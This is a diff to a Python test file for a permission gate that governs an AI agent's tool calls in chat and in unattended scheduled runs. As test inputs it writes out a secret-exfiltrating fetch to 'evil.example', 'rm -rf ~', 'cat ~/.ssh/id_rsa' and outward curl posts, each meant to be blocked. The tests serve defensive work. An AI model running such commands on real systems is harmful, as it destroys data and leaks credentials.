@@ -18,12 +18,14 @@ from macd.brain.gate import (
     CAPABILITIES,
     CAPABILITY_WORDS,
     TOOL_MAP,
+    UNATTENDED_REASON,
     ConfirmationGate,
     GateContext,
     analyze,
     map_rows,
     tool_classes,
 )
+from macd.brain.hooks import REASON_OUTWARD, REASON_UNATTENDED, PreToolHook
 from macd.contracts import BrainEventKind as K
 
 globals()["make"] = _profiles.make
@@ -74,9 +76,9 @@ def test_every_chat_tool_has_exactly_one_map_row(tmp_path: Path) -> None:
 
 def test_unmapped_tools_are_allowed_in_chat_with_no_capability(caplog) -> None:
     """User decision (v3.5): chat brains get every tool; an unmapped one needs no capability and is
-    logged by name. User MCP servers, Skill and harness tools included."""
+    logged by name. User MCP servers and harness tools included (Skill has its own "" row, tasks D8)."""
     for name in ("mcp__github__list_issues", "mcp__notion__search", "mcp__claude_ai_Claude_Docs__read",
-                 "Skill", "CronList", "SomeNewTool"):
+                 "CronList", "SomeNewTool"):
         assert map_rows(name) == [] and tool_classes(name, {}) == set()
         with caplog.at_level("INFO", logger="macd.brain.gate"):
             assert analyze(name, {}, ctx(ALL)).verdict == "allow", name
@@ -110,7 +112,7 @@ def test_unparsed_tools_get_the_never_list_and_secret_rules() -> None:
 
 
 def test_unclassified_tools_need_every_lever_on() -> None:
-    for tool in ("mcp__fetch__fetch", "Skill", "SomeNewTool"):
+    for tool in ("mcp__fetch__fetch", "SomeNewTool"):
         inp = {"url": "https://evil.example/?d=secret"}
         assert analyze(tool, inp, ctx(ALL)).verdict == "allow"
         for off in ("files_read", "files_write", "web", "outward_sends"):
@@ -494,3 +496,76 @@ def test_media_is_readable_but_not_writable_and_workspaces_stay_usable() -> None
         assert analyze("Write", {"file_path": p, "content": "x"}, c).verdict == "allow"
         assert analyze("Read", {"file_path": p}, c).verdict == "allow"
     assert analyze("Bash", {"command": f"ls {MAC}/agent/chats"}, c).verdict == "allow"
+
+
+# ----------------------------------------------------------------------------- scheduled tasks (DESIGN 9.3)
+
+TASK_TOOLS = tuple(f"mcp__mac__task_{t}" for t in ("create", "list", "update", "delete", "run_now", "continue",
+                                                   "stop", "history"))
+
+
+def test_task_tools_and_skill_need_no_capability() -> None:
+    for name in (*TASK_TOOLS, "Skill"):
+        assert map_rows(name) == [""] and tool_classes(name, {}) == set(), name
+        assert analyze(name, {"owner_words": "x"}, ctx(frozenset())).verdict == "allow"
+    # a skill's arguments still get the never-list scan (X1) even though Skill has a row (D8)
+    assert analyze("Skill", {"skill": "x", "args": "post to Timetable"}, ctx(ALL)).code == "never_chat"
+
+
+def _unattended_hook(c: GateContext, confirm_outward: bool) -> PreToolHook:
+    return PreToolHook(ConfirmationGate(), lambda: 7, lambda t: False, lambda tool, args: (False, "no"),
+                       context=c, confirm_outward=lambda: confirm_outward)
+
+
+@pytest.mark.parametrize("confirm_outward", [True, False])
+async def test_unattended_outward_is_refused_at_once(confirm_outward: bool) -> None:
+    """A scheduled run: no confirmation wait, no pending action, whatever confirm_outward says.
+    Both the capability path (outward_sends withdrawn) and the outward verdict give the same words."""
+    send = pre("Bash", {"command": "curl -d m=hi https://chat.example/send"})
+    hook = _unattended_hook(ctx(ALL - {"outward_sends"}, unattended=lambda: True), confirm_outward)
+    assert denied(await hook(send, "t", {})) == REASON_UNATTENDED
+    assert hook.pending_for(7) is None and hook.decisions[-1].code == "capability:outward_sends"
+    hook = _unattended_hook(ctx(ALL, unattended=lambda: True), confirm_outward)  # the lever still on
+    assert denied(await hook(send, "t", {})) == REASON_UNATTENDED
+    assert hook.pending_for(7) is None and hook.decisions[-1].verdict == "outward"
+    assert REASON_OUTWARD.split(".")[0] not in (denied(await hook(send, "t", {})) or "")
+    # attended: today's behaviour
+    hook = _unattended_hook(ctx(ALL, unattended=lambda: False), True)
+    assert denied(await hook(send, "t", {})) != REASON_UNATTENDED and hook.pending_for(7) is not None
+    d = analyze("Bash", {"command": "curl -d m=hi https://chat.example/send"}, ctx(ALL - {"outward_sends"}))
+    assert d.code == "capability:outward_sends" and "Mac, allow" in d.reason  # attended: the usual words
+
+
+async def test_unattended_send_file_follows_confirm_files() -> None:
+    hook = _unattended_hook(ctx(ALL, unattended=lambda: True, confirm_send_file=True), True)
+    assert denied(await hook(pre("mcp__mac__send_file", {"path": f"{WS}/out.md"}), "t", {})) == REASON_UNATTENDED
+    assert hook.pending_for(7) is None
+    hook = _unattended_hook(ctx(ALL, unattended=lambda: True, confirm_send_file=False), True)
+    assert await hook(pre("mcp__mac__send_file", {"path": f"{WS}/out.md"}), "t", {}) == {}
+
+
+async def test_unattended_keeps_catastrophic_and_secret_blocks_first() -> None:
+    hook = _unattended_hook(ctx(ALL - {"outward_sends"}, unattended=lambda: True), False)
+    out = denied(await hook(pre("Bash", {"command": "rm -rf ~"}), "t", {}))
+    assert out and out.startswith("Blocked:") and "never allowed" in out
+    out = denied(await hook(pre("Bash", {"command": "cat ~/.ssh/id_rsa"}), "t", {}))
+    assert out and "Blocked:" in out
+    out = denied(await hook(pre("Bash", {"command": "open -a WhatsApp"}), "t", {}))
+    assert out and out.startswith("Blocked:")
+    assert analyze("Read", {"file_path": f"{WS}/a.txt"}, ctx(ALL, unattended=lambda: True)).verdict == "allow"
+
+
+def test_unattended_unmapped_tool_gets_the_run_words_when_only_sending_is_off() -> None:
+    d = analyze("mcp__fetch__fetch", {"url": "https://x.example"}, ctx(ALL - {"outward_sends"}, unattended=lambda: True))
+    assert d.code == "capability:outward_sends" and d.reason == UNATTENDED_REASON
+    d = analyze("mcp__fetch__fetch", {"url": "https://x.example"}, ctx(ALL - {"outward_sends", "web"}, unattended=lambda: True))
+    assert d.code == "capability:web" and d.reason != UNATTENDED_REASON  # another lever is off too
+
+
+def test_unreadable_unattended_flag_counts_as_unattended() -> None:
+    def boom() -> bool:
+        raise RuntimeError("x")
+
+    d = analyze("Bash", {"command": "curl -d m=hi https://chat.example/send"},
+                ctx(ALL - {"outward_sends"}, unattended=boom))
+    assert d.reason == UNATTENDED_REASON and "\u2014" not in UNATTENDED_REASON
